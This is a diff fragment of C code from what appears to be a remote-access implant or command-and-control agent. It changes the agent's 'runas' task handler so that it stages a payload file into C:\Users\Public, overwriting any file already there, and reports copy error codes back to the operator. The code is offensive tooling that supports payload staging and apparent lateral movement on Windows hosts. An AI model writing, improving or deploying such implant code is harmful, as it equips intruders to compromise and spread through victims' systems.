@@ -3985,8 +3985,13 @@ void dispatch_task(AgentTask *task) {
                 agent_send_result(task->id, "", "runas: payload path is empty"); return;
             }
             snprintf(pub_path, sizeof(pub_path), "C:\\Users\\Public\\%s", base);
-            if (_stricmp(lat_cmd, pub_path) != 0 && !CopyFileA(lat_cmd, pub_path, TRUE)) {
-                agent_send_result(task->id, "", "runas: could not stage payload in C:\\Users\\Public");
+            if (_stricmp(lat_cmd, pub_path) != 0 && !CopyFileA(lat_cmd, pub_path, FALSE)) {
+                DWORD copy_err = GetLastError();
+                char stage_err[256];
+                snprintf(stage_err, sizeof(stage_err),
+                         "runas: could not stage payload in C:\\Users\\Public (CopyFileA error %lu)",
+                         (unsigned long)copy_err);
+                agent_send_result(task->id, "", stage_err);
                 return;
             }
             if (GetFileAttributesA(pub_path) == INVALID_FILE_ATTRIBUTES) {
